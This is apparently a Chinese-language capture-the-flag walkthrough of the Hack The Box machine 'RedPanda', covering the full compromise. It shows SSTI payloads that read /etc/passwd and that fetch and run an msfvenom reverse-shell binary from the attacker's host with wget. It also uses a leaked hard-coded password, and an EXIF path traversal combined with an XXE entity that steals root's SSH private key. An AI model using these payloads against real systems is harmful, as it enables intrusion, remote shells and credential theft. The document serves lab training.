![在这里插入图片描述](https://img-blog.csdnimg.cn/aa8cf96e05004dd09480b4c3814bd1d4.png)

网址：
```
https://app.hackthebox.com/machines/RedPanda
```
# 信息搜集
使用nmap扫描ip
```
nmap -sC -sV -p- 10.10.11.170

Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-17 00:14 EDT
Stats: 0:11:45 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 48.06% done; ETC: 00:38 (0:12:41 remaining)
Stats: 0:11:54 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 48.60% done; ETC: 00:38 (0:12:34 remaining)
Stats: 0:21:52 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 00:36 (0:00:18 remaining)
Nmap scan report for 10.10.11.170
Host is up (0.29s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http-proxy
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/5111af455bd8485cb4b95b9f5ee1dcc2.png)

这台机子只开启了两个端口，我们去web页面看看


![在这里插入图片描述](https://img-blog.csdnimg.cn/f9f108fab23a4ecca62f8bb377419553.png)

下面有一个搜索框，我尝试了sql注入和xxe攻击都没用，用ffuf扫描网站的根目录也没有什么泄露的文件，nuclei工具也没能给我们什么有用的信息

![在这里插入图片描述](https://img-blog.csdnimg.cn/be1739039d974244a39522cf1f282ca2.png)

单击搜索会出现一个页面

![在这里插入图片描述](https://img-blog.csdnimg.cn/b878270e31c1461da349de2e82525167.png)

在下面提示了我们需要注入攻击，sql和xxe都试过了，现在该试试ssti攻击了

xxe攻击介绍:
```
https://blog.csdn.net/qq_45894840/article/details/124251964?spm=1001.2014.3001.5502
```

# 什么是SSTI
ssti的意思是服务端模板注入攻击，那什么是模板呢

简单来说，就是网站内容的动态部分，如果有一个网站的内容几乎相同，但只有某些部分发生改变，那么他们很有可能使用了模板
模板看起来如下：
```
hello{user.name}
他们有一个静态罐和一个动态罐，hello为静态罐，{}里的内容为动态罐
```
这就是为什么编译器如何是知道该部分是动态的，另外需要注意的是，并非是所有模板看起来都是像上面那样，列如：
```
hello{{user.name}}
```
这是一个名为jinja模板引擎的示例，用流行的python框架（如django和flask）
# 什么是模板注入
如题所示，它就是存在于web应用中的注入漏洞，例如：
```
template = "Bio: {{ user.bio }}"
render(template)
```
如果使用此模板显示用户的输入，那么它是完全安全的，因为我们所做的只是从数据库中获取当前用户的信息，然后将其返回给用户，但下面这个例子就不太一样了：
```
template = "Bio:  " + USER_INPUT
render(template)
```
如果用户的输入的成为模板的一部分，那么我们就有一个大问题，因为模板有能力执行任意代码，所以用户可以在服务器上获得一个shell
这种漏洞通常被称为服务器模板注入，攻击者可以在其中注入恶意模板代码来获得shell，但需要注意的一点是，它不仅限于服务器，只要模板可用，漏洞就可以存在于任何地方
更详细的原理解释
```
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
```
## 检查是否存在SSTI
可以使用以下字符串来测试模板是否存在SSTI，以及网站黑名单
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```
在测试到最后两个字符串时，网页出现了变化


![在这里插入图片描述](https://img-blog.csdnimg.cn/564602a3024c4ebb8f390a9c06b3071d.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/13f10475bda048329d403ceacf29e4b2.png)


服务器执行了我们输入的字符串，7*7

说明网站存在SSTI漏洞，现在尝试读取机子上的/etc/passwd文件

```
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/4ed1fc392829401a84012b93307e4410.png)
# 反弹shell，获取用户权限

成功读取，现在我们尝试反弹shell，用python开启http服务器
```
python3 -m http.server 80
```
然后去靶机网站上执行以下内容
```
*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("curl http://10.10.14.10")}
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/dd0ccc3682904ae895703d9dc59be2d3.png)

可以看到，靶机可以访问我们网站，然后我们用msfvenom生成一个木马
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=4444 -f elf > shell.elf
chmod 777 shell.elf
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/47e10f64403545899238e3e3cdfcfda6.png)


然后用netcat监听shell返回的端口
```
nc -lvnp 4444
```
去到靶机网站上，依次执行以下内容
```
*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("wget http://10.10.14.10/shell.elf")}  //从我们网站上获取木马

*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("chmod 777 ./shell.elf")}   //给木马当前用户最大的权限

*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("./shell.elf")}   //执行木马
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/ef6eb80999634bff934e492324065403.png)

成功返回shell
```
python3 -c 'import pty; pty.spawn("/bin/bash")'  //获取bash，使shell更方便
```

# 提权
## 信息搜集
现在我们只是一个普通用户的权限，需要获取root权限，首先我们还需要用linpeas脚本搜集机子的基本信息

这是一个自动化枚举工具：
```
https://github.com/carlospolop/PEASS-ng/releases/tag/20221016
```

下载好后，放到刚刚生成木马的文件夹里


![在这里插入图片描述](https://img-blog.csdnimg.cn/53383b54a95b48e3bed45659da310f4a.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/dad4ce9f7f8c4ae882f838009b1d30b2.png)

然后将这个脚本移动到靶机里
```
wget http://10.10.14.10/linpeas.sh
chmod 777 linpeas.sh
./linpeas.sh
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/1e3bcd862c5f4ae1a635bd77a5053e8f.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/dff2d7f05984456d91efa34ce6a81937.png)

sudo程序有漏洞，但是无法在机子上编译c文件，在kali上编译后，去机子上执行也失败


![在这里插入图片描述](https://img-blog.csdnimg.cn/130b7db9b42341c080c4dca0bc61d8ca.png)



但是找到了网站模板的目录，还发现机子正在执行mysql数据库

![在这里插入图片描述](https://img-blog.csdnimg.cn/39ae516b2cbb49a682f43059bc9579ec.png)


在网站模板的目录里找了一会，发现了一个文件有用户的密码
```
cat /opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/6eef21eccf114838a7d7b157ca29a9c3.png)

woodenk用户的密码是RedPandazRule，然后ssh登录上去

```
ssh woodenk@10.10.11.170
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/92482cf328954448b9b215d6c87c7722.png)

由于机子开启了mysql服务，我登录进数据库里并没有找到什么有用的信息

然后使用pspy程序监听linux进程
```
https://github.com/DominicBreuker/pspy
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/17c45a19df6b45048be779961fdc1bff.png)

然后将此程序移动到靶机里，操作和上面的linpeas脚本一样



![在这里插入图片描述](https://img-blog.csdnimg.cn/309e10ea725d4ab496ea963ae20189c6.png)


运行程序后，等待几分钟，可以发现一些有用的信息

![在这里插入图片描述](https://img-blog.csdnimg.cn/5b2716ecc6f84c1dabad2c1997039259.png)

在opt目录下有一个脚本在运行，我们查看一下

![在这里插入图片描述](https://img-blog.csdnimg.cn/7e6a0acb2d2b474c9adfb7a7ba99d2fc.png)
# 提权root

他定时会删除一些指定文件名的文件，再去看看之前找到用户名密码的文件
```
cat /opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/e93bb56e474c44bcbc15f62fcc140cd9.png)
```
@GetMapping(value="/export.xml", produces = MediaType.APPLICATION_OCTET_STREAM_VALUE)
        public @ResponseBody byte[] exportXML(@RequestParam(name="author", defaultValue="err") String author) throws IOException {

                System.out.println("Exporting xml of: " + author);
                if(author.equals("woodenk") || author.equals("damian"))
                {
                        InputStream in = new FileInputStream("/credits/" + author + "_creds.xml");
                        System.out.println(in);
                        return IOUtils.toByteArray(in);
                }
                else
                {
                        return IOUtils.toByteArray("Error, incorrect paramenter 'author'\n\r");
                }
        }
```
这是程序导出xml文件方式，还可以在网站上直接下载这个xml文件

![在这里插入图片描述](https://img-blog.csdnimg.cn/15c64567c6014ce280dd11d3485be5df.png)


最关键的是机子在以root的身份执行另一个jar文件，我们下载然后用jd-gui打开看看

jd-gui工具下载地址：
```
http://java-decompiler.github.io/
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/43d93bf436d144079f28d085315fe6df.png)

移动到此目录，打开python的http服务器，然后获取此文件
```
cd /opt/credit-score/LogParser/final/target
python3 -m http.server 6666
```

然后用kali获取此jar文件
```
wget http://10.10.11.170:6666/final-1.0-jar-with-dependencies.jar
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/6735dee409ab40fbbd6429818e7bcdd4.png)

用jd-gui打开

![在这里插入图片描述](https://img-blog.csdnimg.cn/2b7b01ad84074ad493ab537845e96a64.png)

在这里可以发现一些关键信息

```
  public static String getArtist(String uri) throws IOException, JpegProcessingException {
    String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
    File jpgFile = new File(fullpath);
    Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
    for (Directory dir : metadata.getDirectories()) {
      for (Tag tag : dir.getTags()) {
        if (tag.getTagName() == "Artist")
          return tag.getDescription(); 
      } 
    } 
    return "N/A";
  }
```

jpg文件的元数据标签"Artist"必须有与/credits/<author_name>_creds.xml文件里的值匹配


我们可以在“Artist”字段中注入 xml 所在的路径，然后获取我们想要的信息

我们随便选取一张图片，设置exif信息，然后将图片移动到靶机里

![在这里插入图片描述](https://img-blog.csdnimg.cn/a0998bb5ec054bceac849ea4fd524f04.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/480809e76e594df9837c281d34ce2f58.jpeg)
```
exiftool -Artist="../home/woodenk/privesc" gato.jpg
scp gato.jpg woodenk@10.10.11.170:.
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/296647cc128a4424b8d8d4d3061f7eb6.png)

接下来，我们将在当前用户目录中创建一个xml文件，获取root私钥


```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY key SYSTEM "file:///root/.ssh/id_rsa"> ]>
<credits>
  <author>damian</author>
  <image>
    <uri>/../../../../../../../home/woodenk/gato.jpg</uri>
    <privesc>&key;</privesc>
    <views>0</views>
  </image>
  <totalviews>0</totalviews>
</credits>
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/0fdf3e8a845c44b3834673dd4ea48943.png)


```
public static Map parseLog(String line) {
    String[] strings = line.split(
    Map map = new HashMap<>();
    map.put("status_code", Integer.parseInt(strings[
    map.put("ip", strings[1]);
    map.put("user_agent", strings[2]);
    map.put("uri", strings[3]);
    return map;
}
```
然后要设置User-Agent头发出curl请求
```
curl http://10.10.11.170:8080 -H "User-Agent: ||/../../../../../../../home/woodenk/gato.jpg"
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/fa2906b0d23548edabc6cd65b116150b.png)

下载程序导出的xml文件，触发xxe

回到靶机里，查看文件，可以发现root的私钥

![在这里插入图片描述](https://img-blog.csdnimg.cn/1ea71d60fb8942df8f7d1010009aa3ca.png)


```
touch id_rsa
chmod 600 id_rsa
```
然后将密钥信息粘贴进去
```
ssh root@10.10.11.170 -i id_rsa
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/1a39b7ae05d34b6e91febd450dc553fb.png)

成功提权到root

![在这里插入图片描述](https://img-blog.csdnimg.cn/910ae615bd2a481c81f5ba6727519e51.png)

HTB个人页面，欢迎大家来关注
```
https://app.hackthebox.com/profile/356040
```
